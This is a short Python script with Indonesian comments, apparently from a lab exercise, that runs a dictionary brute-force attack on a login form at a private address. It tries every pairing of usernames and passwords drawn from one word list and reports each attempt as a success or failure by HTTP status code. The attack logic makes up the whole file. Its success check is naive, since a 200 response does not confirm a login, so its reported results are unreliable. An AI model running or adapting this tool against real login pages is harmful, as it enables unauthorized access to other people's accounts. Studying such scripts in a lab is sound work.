import requests

url = "http://10.8.0.111:80/codelab/index.php/auth" # Sesuaikan URL

# Membaca daftar password dari file
with open("dictionary.txt", "r") as file:
    username = passwords = file.read().splitlines()

print("Memulai simulasi Brute Force...\n")

for adm in username:
    for pwd in passwords:
        data = {"username": adm, "password": pwd}
        response = requests.post(url, data=data)
 
        if response.status_code == 200:
            print(f"[SUKSES][{response.status_code}] Username: {adm} Password: {pwd}")
        else:
            print(f"[GAGAL]{response.status_code} Username: {adm} Password: {pwd}")